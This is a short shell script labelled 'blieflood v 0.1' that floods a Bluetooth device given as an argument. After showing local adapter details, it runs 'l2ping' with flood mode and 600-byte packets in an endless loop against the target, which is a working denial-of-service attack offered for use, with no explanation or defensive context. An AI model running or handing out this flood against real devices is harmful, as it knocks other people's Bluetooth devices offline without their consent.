
target=$1
echo blieflood v 0.1 - flood on $target
hciconfig -a
sleep 5
while :
do
   l2ping -s 600 -f $target  
done
